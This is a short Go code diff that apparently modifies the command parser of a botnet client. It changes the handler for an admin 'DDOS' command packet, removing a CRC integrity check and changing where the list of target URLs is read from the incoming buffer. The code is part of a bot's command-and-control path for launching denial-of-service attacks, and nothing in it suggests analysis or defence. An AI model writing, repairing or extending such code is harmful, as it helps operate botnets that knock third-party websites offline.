@@ -120,12 +120,7 @@ func (this *ClientModule) ParseData(socketBuf []byte) {
 		break
 
 	case constants.ADMIN_PACKET_CTYPE_COMMAND_DDOS:
-		if !utils.CheckCRC(this.receiveBuf) {
-			this.logger.Warning("CRC detected an error when parsing the packet, not all data was received")
-			return
-		}
-
-		urlsBytes := this.receiveBuf[12:]
+		urlsBytes := this.receiveBuf[5:]
 
 		var urls []string
 		if err := json.Unmarshal(urlsBytes, &urls); err != nil {
